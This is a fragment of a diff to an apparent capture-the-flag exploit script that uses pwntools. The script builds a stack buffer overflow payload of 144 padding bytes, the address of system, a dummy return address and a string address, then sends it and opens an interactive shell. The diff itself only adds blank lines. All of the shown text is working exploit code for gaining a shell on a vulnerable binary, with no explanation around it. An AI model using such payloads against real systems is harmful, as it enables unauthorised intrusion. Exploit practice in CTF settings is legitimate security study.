@@ -161,11 +161,15 @@ system_addr = p32(0x080485b0)
 bin_addr = p32(0x8048eb1)
 
 payload = "A"*144
+
 payload += system_addr
+
 payload += "A"*4
+
 payload += bin_addr
 
 p.sendline(payload)
+
 p.interactive()
 
 
